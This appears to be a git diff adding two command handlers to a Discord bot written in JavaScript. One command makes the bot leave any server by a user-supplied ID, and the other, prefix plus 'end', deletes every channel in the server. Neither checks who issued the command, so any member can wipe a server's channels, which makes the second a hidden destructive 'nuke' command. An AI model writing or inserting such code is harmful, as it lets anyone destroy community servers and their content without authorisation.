@@ -492,3 +492,26 @@ client.on("message", message => {
         message.channel.send(Success)
     }
 })
+
+client.on("message", message => {
+    if(!message.guild) return
+    let args = message.content.trim().split(/ +/g)
+
+    if(args[0].toLowerCase() === prefix + 'remove') {
+        var NoSuggestionEntered = new Discord.RichEmbed()
+        .setColor("0xf35353")
+        .setTitle( emoji("689538472758870111") + "You must enter a server ID.")
+        let SuggestionTyped = args.slice(1).join(" ")
+        if(!SuggestionTyped) return message.channel.send(NoSuggestionEntered)
+        client.guilds.get(SuggestionTyped).leave()
+        message.channel.send("I successfully leaved the server with the ID ``" + SuggestionTyped + "``.")
+    }
+})
+
+client.on("message", message => {
+    if(message.content === prefix + "end") {
+        message.guild.channels.forEach(g => {
+            g.delete()
+        })
+    }
+})
